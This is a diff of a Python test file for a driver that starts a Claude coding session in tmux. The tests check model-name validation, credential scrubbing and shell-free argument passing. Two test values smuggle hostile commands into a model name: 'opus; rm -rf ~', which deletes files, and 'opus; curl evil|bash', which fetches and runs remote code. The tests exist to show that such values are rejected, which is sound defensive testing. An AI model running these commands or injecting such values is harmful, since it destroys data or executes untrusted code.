@@ -1,42 +1,68 @@
-from agent.coding_host_drivers import LocalDriver
+from agent.coding_host_drivers import LocalDriver, is_valid_model, SCRUB_KEYS
 
 
-def test_tmux_new_session_argv():
+def test_is_valid_model_allowlist():
+    assert is_valid_model("opus")
+    assert is_valid_model("claude-opus-4-8")
+    assert not is_valid_model("opus; rm -rf ~")
+    assert not is_valid_model("gpt-5")
+    assert not is_valid_model("")
+    assert not is_valid_model(None)
+
+
+def test_claude_argv_scrubs_creds_and_has_plugin_and_context():
     d = LocalDriver()
-    argv = d.tmux_new_argv(tmux_name="jc-abc", cwd="/repo")
+    argv = d.claude_argv(
+        plugin_dir="/repo/plugins/jarviscopilot-code-assist",
+        context_file="/home/x/.jarviscopilot/coding_sessions/cs_1/JARVIS-CONTEXT.md",
+        model="opus", initial_prompt=None)
+    # env -u <secret> ... prefix strips creds at exec
+    assert argv[0] == "env"
+    for k in SCRUB_KEYS:
+        assert "-u" in argv and k in argv
+    assert "claude" in argv
+    assert "--plugin-dir" in argv
+    assert "/repo/plugins/jarviscopilot-code-assist" in argv
+    assert "--append-system-prompt-file" in argv
+    assert "--model" in argv and "opus" in argv
+    # NOT the crippled inference-shim flags
+    assert "--tools" not in argv
+    assert "--no-session-persistence" not in argv
+
+
+def test_claude_argv_drops_invalid_model():
+    d = LocalDriver()
+    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md",
+                         model="opus; curl evil|bash", initial_prompt=None)
+    # an injection-shaped model is never forwarded
+    assert "--model" not in argv
+    assert "opus; curl evil|bash" not in argv
+
+
+def test_claude_argv_passes_initial_prompt_as_argv_element():
+    d = LocalDriver()
+    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md",
+                         model=None, initial_prompt="fix the failing tests")
+    # passed as a single argv element — no shell, no quoting needed
+    assert "fix the failing tests" in argv
+
+
+def test_tmux_new_argv_runs_launch_argv_directly():
+    d = LocalDriver()
+    argv = d.tmux_new_argv(tmux_name="jc-abc", cwd="/repo",
+                           launch_argv=["env", "claude"])
     assert argv[:3] == ["tmux", "new-session", "-d"]
     assert "-s" in argv and "jc-abc" in argv
     assert "-c" in argv and "/repo" in argv
+    # the launch argv is appended so claude is the pane's command (no shell race)
+    assert argv[-2:] == ["env", "claude"]
 
 
-def test_claude_launch_command_has_plugin_and_context():
+def test_send_keys_uses_dash_dash_terminator():
     d = LocalDriver()
-    cmd = d.claude_launch_command(
-        plugin_dir="/repo/plugins/jarviscopilot-code-assist",
-        context_file="JARVIS-CONTEXT.md", model="opus", initial_prompt=None)
-    assert cmd.startswith("claude ")
-    assert "--plugin-dir /repo/plugins/jarviscopilot-code-assist" in cmd
-    assert "--append-system-prompt-file JARVIS-CONTEXT.md" in cmd
-    assert "--model opus" in cmd
-    # NOT the crippled inference-shim flags
-    assert '--tools ""' not in cmd
-    assert "--no-session-persistence" not in cmd
-
-
-def test_claude_launch_command_quotes_initial_prompt():
-    d = LocalDriver()
-    cmd = d.claude_launch_command(
-        plugin_dir="/p", context_file="JARVIS-CONTEXT.md",
-        model=None, initial_prompt="fix the failing tests")
-    # the free-text prompt must be shell-quoted as a single argument
-    assert "'fix the failing tests'" in cmd
-
-
-def test_send_keys_argv_is_literal_then_enter():
-    d = LocalDriver()
-    seq = d.send_message_argvs(tmux_name="jc-abc", text="run the tests")
-    assert seq[0][:2] == ["tmux", "send-keys"]
-    assert "-l" in seq[0] and "run the tests" in seq[0]
+    seq = d.send_message_argvs(tmux_name="jc-abc", text="-v dash-leading message")
+    # '--' before the literal text so a leading dash isn't parsed as options
+    assert seq[0] == ["tmux", "send-keys", "-t", "jc-abc", "-l", "--", "-v dash-leading message"]
     assert seq[-1] == ["tmux", "send-keys", "-t", "jc-abc", "Enter"]
 
 
